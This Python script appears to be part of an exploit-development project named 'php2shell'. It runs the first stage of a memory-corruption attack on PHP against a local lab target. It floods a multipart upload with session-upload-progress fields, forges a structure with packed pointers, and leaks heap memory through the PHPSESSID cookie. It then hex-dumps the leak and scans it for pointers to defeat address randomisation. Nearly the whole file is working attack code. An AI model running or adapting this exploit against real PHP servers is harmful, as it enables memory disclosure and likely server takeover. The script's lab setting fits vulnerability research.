#!/usr/bin/env python3
"""Capture a full stage-1 leak response in p2s-alv and dump the decoded cookie
content so we can see what PS(id) pointed at (structure layout)."""
import struct, sys, time

sys.path.insert(0, "/Users/bill/php2shell/alvaro")
from exploit import Target, multipart, parse_cookie, Exploit  # noqa: E402

T = Target("http://localhost:18111/index.php", timeout=60)


def main():
    ex = Exploit(T, "id", 0x5996e0, 0x7b47a0, 0x7e0d8, 24)
    ex.rotate(); time.sleep(0.5)
    ex._oom(b"x"); time.sleep(0.3)

    SID = b"attacksessionid0001"
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(841):
        parts.append({"name": str(1000 + i),
                      "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})

    resp = T.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    open("/tmp/p2s-lab/stage1_raw.resp", "wb").write(resp)
    import re as _re
    m = _re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        print("no cookie in response (%d bytes)" % len(resp)); return 1
    import urllib.parse
    dec = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
    open("/tmp/p2s-lab/stage1_leak.bin", "wb").write(dec)
    print("leaked %d bytes; first 256:" % len(dec))
    for off in range(0, min(len(dec), 256), 16):
        chunk = dec[off:off + 16]
        hexs = " ".join("%02x" % b for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print("  %04x  %-48s  %s" % (off, hexs, asc))
    # pointer scan summary
    from collections import Counter
    c = Counter()
    for i in range(len(dec) - 8):
        v = int.from_bytes(dec[i:i + 8], "little")
        if 0x100000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    print("pointer buckets:", [(hex(k), n) for k, n in c.most_common(8)])


if __name__ == "__main__":
    main()
